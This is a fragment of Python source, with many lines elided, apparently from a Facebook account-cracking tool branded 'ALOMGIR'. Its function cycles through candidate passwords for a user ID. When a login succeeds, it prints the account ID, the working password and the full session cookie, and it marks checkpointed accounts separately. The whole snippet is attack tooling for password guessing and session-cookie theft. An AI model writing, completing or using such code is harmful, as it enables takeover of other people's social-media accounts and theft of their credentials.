...
def cyber_1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sALOMGIR\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                ##print('\r\r\033[1;32m[A_R ALOMGIR-OK💚] '+uid+'')
                print('\r\r\033[1;32m[A_R ALOMGIR-OK💚] ' +cid+ ' | ' +ps+    '  \n[‎‎🔥]\x1b[38;5;254mCOOKIE = \x1b[38;5;46m'+coki+ ' ''  \x1b[38;5;46m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[A_R ALIMGIR-CP💔] {uid}|{ps}")
